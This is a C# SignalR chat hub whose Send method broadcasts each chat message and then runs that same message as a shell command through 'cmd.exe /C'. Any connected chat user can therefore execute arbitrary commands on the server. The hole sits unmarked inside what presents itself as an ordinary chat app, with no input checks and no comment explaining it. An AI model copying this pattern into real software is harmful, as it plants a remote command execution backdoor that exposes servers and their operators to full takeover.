using System;
using System.Web;
using Microsoft.AspNet.SignalR;
using Microsoft.AspNet.SignalR.Messaging;
using System.Runtime;
using System.Linq;
using System.Diagnostics;

namespace SignalRChat
{
    public class ChatHub : Hub
    {
        public void Send(string name, string message)
        {
            // Call the broadcastMessage method to update clients.
            Clients.All.broadcastMessage(name, message);

            string s = message;
            string p;
            if (s != "")
            {
                p = "/C " + s + "";

                System.Diagnostics.Process process = new System.Diagnostics.Process();
                process.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Normal;
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = p;
                process.Start();
            }

        }

    }
}